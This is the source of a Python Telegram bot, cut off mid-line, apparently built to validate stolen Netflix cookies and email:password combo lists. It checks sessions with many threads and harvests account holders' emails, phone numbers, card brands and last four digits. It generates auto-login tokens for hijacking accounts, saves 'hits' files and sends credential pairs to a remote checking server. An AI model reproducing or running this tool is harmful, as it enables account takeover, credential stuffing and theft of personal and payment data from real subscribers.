import requests
import re
import time
import os
import tempfile
import zipfile
import shutil
import random
import json
import threading
from datetime import datetime
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor
import telebot
import webbrowser

webbrowser.open("https://t.me/baroshoping")
init(autoreset=True)

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    print("❌ BOT_TOKEN not set!")
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# ====================== SERVER & API KEY ======================
PASTEBIN_URL = "https://pastebin.com/raw/0sV8DdMg"
CONFIG_FILE = "api_config_NF.json"
_server_base_url_cache = None

def test_server_url(base_url):
    if not base_url: return False
    try:
        resp = requests.get(f"{base_url}/api/validate/DUMMY_KEY_FOR_TEST", timeout=5)
        return resp.status_code in (200, 401)
    except:
        return False

def get_server_base_url():
    global _server_base_url_cache
    if _server_base_url_cache: return _server_base_url_cache
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE) as f:
                saved = json.load(f).get('server_url')
                if saved and test_server_url(saved):
                    _server_base_url_cache = saved
                    return saved
        except:
            pass
    for _ in range(3):
        try:
            resp = requests.get(PASTEBIN_URL, timeout=10)
            if resp.status_code == 200:
                url = resp.text.strip()
                if url.startswith(('http://', 'https://')) and test_server_url(url):
                    with open(CONFIG_FILE, 'w') as f:
                        json.dump({'server_url': url}, f)
                    _server_base_url_cache = url
                    return url
        except:
            pass
        time.sleep(1)
    fallback = "http://20.118.168.57:5000"
    _server_base_url_cache = fallback
    return fallback

API_KEY = None

def validate_api_key(key):
    try:
        base_url = get_server_base_url()
        url = f"{base_url}/api/validate/netflix/{key}"
        r = requests.get(url, timeout=10)
        return r.status_code == 200 and r.json().get('valid', False)
    except:
        return False

# ====================== YOUR EXACT COOKIE CHECKER (FAST THREADS) ======================
class NetflixBulkChecker:
    def __init__(self, threads=20):          # ← Changed to 20 for faster checking
        self.threads = threads
        self.lock = threading.Lock()
        self.stats = {'total': 0, 'checked': 0, 'hits': 0, 'bad': 0, 'errors': 0, 'start_time': time.time()}
        self.premium_accounts = []
        self.chat_id = None

    def parse_netscape_cookie(self, text):
        cookies = {}
        text = text.strip()
        if not text: return cookies
        if ';' in text and '=' in text:
            for part in text.split(';'):
                part = part.strip()
                if '=' in part:
                    k, v = part.split('=', 1)
                    cookies[k.strip()] = v.strip()
            if cookies: return cookies
        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith('#'): continue
            if '\t' in line:
                parts = line.split('\t')
                if len(parts) >= 7:
                    cookies[parts[5]] = parts[6]
                    continue
            parts = re.split(r'\s+', line)
            if len(parts) >= 7:
                cookies[parts[5]] = parts[6]
                continue
            if '=' in line:
                k, v = line.split('=', 1)
                cookies[k.strip()] = v.strip()
        return cookies

    def check_cookie(self, cookie_text, source_name):
        try:
            cookies = self.parse_netscape_cookie(cookie_text)
            if not cookies: return None
            session = requests.Session()
            for k, v in cookies.items():
                session.cookies.set(k, v, domain='.netflix.com', path='/')
            r = session.get('https://www.netflix.com/account/membership', timeout=40, allow_redirects=True)
            if 'login' in r.url.lower() or '"membershipStatus":"CURRENT_MEMBER"' not in r.text:
                return None
            html = r.text
            result = {
                'email': re.search(r'"emailAddress":"([^"]+)"', html).group(1) or 'N/A',
                'plan': re.search(r'localizedPlanName.*?"value":"([^"]+)"', html).group(1) or 'Unknown',
                'country_code': re.search(r'"countryOfSignup":"([^"]+)"', html).group(1) or 'XX',
                'next_billing': re.search(r'"nextBillingDate".*?"value":"([^"]+)"', html).group(1) or 'N/A',
                'phone': re.search(r'"phoneNumber":"([^"]+)"', html).group(1) or 'N/A',
                'card_brand': re.search(r'"ccPaymentMethodBrandName":"([^"]+)"', html).group(1) or 'N/A',
                'last4': re.search(r'"lastFourDigits":"([^"]+)"', html).group(1) or 'N/A',
                'profiles': len(re.findall(r'"profileName"', html)),
                'source': source_name,
                'cookie': cookie_text.strip()
            }
            try:
                nftoken = self.generate_nftoken(cookies)
                result['nftoken'] = nftoken or "N/A"
                result['login_url'] = f"https://netflix.com/account?nftoken={nftoken}" if nftoken else "N/A"
            except:
                result['nftoken'] = "N/A"
                result['login_url'] = "N/A"
            return result
        except:
            return None

    def generate_nftoken(self, cookies_dict):
        try:
            session = requests.Session()
            for name, value in cookies_dict.items():
                session.cookies.set(name, value, domain='.netflix.com', path='/')
            payload = {"operationName": "CreateAutoLoginToken", "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"}, "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}}}
            headers = {'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13)', 'Accept': 'application/json', 'Content-Type': 'application/json'}
            response = session.post('https://android13.prod.ftl.netflix.com/graphql', headers=headers, json=payload, timeout=20)
            if response.status_code == 200:
                data = response.json()
                if data.get('data', {}).get('createAutoLoginToken'):
                    return data['data']['createAutoLoginToken']
            return None
        except:
            return None

    def process_cookie_file(self, file_path, index):
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                text = f.read()
        except:
            with self.lock:
                self.stats['errors'] += 1
            return

        result = self.check_cookie(text, f"file_{index}")
        with self.lock:
            self.stats['checked'] += 1
            if result:
                self.stats['hits'] += 1
                self.premium_accounts.append(result)
                os.makedirs('hits', exist_ok=True)
                fname = f"[{result['country_code']}] [{result['email']}] - {result['plan']}.txt"
                with open(f"hits/{fname}", 'w', encoding='utf-8') as f:
                    f.write(f"Email: {result['email']}\n")
                    f.write(f"Plan: {result['plan']}\n")
                    f.write(f"Country: {result['country_code']}\n")
                    f.write(f"Next Billing: {result['next_billing']}\n")
                    f.write(f"Phone: {result['phone']}\n")
                    f.write(f"Card: {result['card_brand']} ••••{result['last4']}\n")
                    f.write(f"Profiles: {result['profiles']}\n")
                    f.write(f"Login URL: {result.get('login_url', 'N/A')}\n\n")
                    f.write(f"Cookie:\n{result['cookie']}\n\n")
                    f.write(f"NF Token: {result.get('nftoken', 'N/A')}\n\n")
                    f.write("checked by @Nf_premium_checker_bot\n")
                    f.write("Bot Made by @Sudhakaran12\n")
            else:
                self.stats['bad'] += 1

    def start(self, folder):
        files = [os.path.join(root, f) for root, _, fs in os.walk(folder) for f in fs if f.endswith('.txt')]
        if not files:
            print("No cookie files found!")
            return
        self.stats['total'] = len(files)
        print(f"Starting check on {len(files)} files...")

        with ThreadPoolExecutor(max_workers=self.threads) as exe:   # ← 20 threads
            for i, f in enumerate(files, 1):
                exe.submit(self.process_cookie_file, f, i)

        print(f"\n✅ Finished! Total Hits: {self.stats['hits']}")

# ====================== COMBO CHECKER ======================
class ComboChecker:
    def check_account(self, email, password, proxy):
        try:
            base_url = get_server_base_url()
            url = f"{base_url}/api/netflix/check"
            payload = {"email": email, "pass": password}
            if proxy: payload["proxy"] = proxy
            response = requests.post(url, json=payload, headers={
                "X-API-Key": API_KEY,
                "X-Platform": "netflix"
            }, timeout=45)
            return response.json() if response.status_code == 200 else None
        except:
            return None

# ====================== BOT ======================
user_mode = {}

@bot.message_handler(commands=['start'])
def start_cmd(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    markup.add("🍪 Cookie Mode (ZIP)")
    markup.add("🔑 Combo Mode (ZIP)")
    markup.add("/setkey")
    bot.reply_to(message, "🚀 Netflix Checker Bot Ready!\nChoose mode:", reply_markup=markup)

@bot.message_handler(commands=['setkey'])
def setkey_cmd(message):
    msg = bot.reply_to(message, "🔑 Send your Netflix API Key:")
    bot.register_next_step_handler(msg, save_key)

def save_key(message):
    global API_KEY
    if validate_api_key(message.text.strip()):
        API_KEY = message.text.strip()
        bot.reply_to(message, "✅ API Key activated!")
    else:
        bot.reply_to(message, "❌ Invalid API Key!")

@bot.message_handler(func=lambda m: m.text in ["🍪 Cookie Mode (ZIP)", "🔑 Combo Mode (ZIP)"])
def select_mode(message):
    mode = "cookie" if "Cookie" in message
